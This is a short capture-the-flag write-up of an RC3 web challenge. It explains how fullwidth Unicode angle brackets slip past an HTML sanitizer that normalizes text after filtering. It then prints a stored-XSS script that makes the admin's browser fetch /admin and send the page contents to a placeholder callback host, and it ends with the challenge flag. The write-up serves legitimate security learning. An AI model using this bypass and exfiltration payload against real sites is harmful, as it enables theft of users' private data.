There were lots of cats, cat pictures, UNICODE cats, even more UNICODE cats, the title was even cat emojis!

The website was quite simple, submit your cats with HTML tags! Obviously knowing that an admin was going to check each submission and you needed to reach /admin some XSS was the way to go.

The intended way to solve it was to take advantage of a common problem, normalization after sanitation (it turns out there were other issues you could take advantage of, but whatever). Using a unicode less then or greater than (for example U+FF1E ＞) you could bypass the filtering.

After you figured out that, a payload was needed to make the admin request the /admin page, then send the flag back out to you. Here's an example: 

<script＞
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
    xhr.open('GET', 'http://YOURCALLBACKIP?result=' + this.responseText);
    xhr.send()
  }
};
xhr.open('GET', 'http://127.0.0.1:3000/admin');
xhr.send()
</script＞

Then you'd be presented with the flag:
RC3{un1c0de_s3cur1ty_is_s0_3asy!}
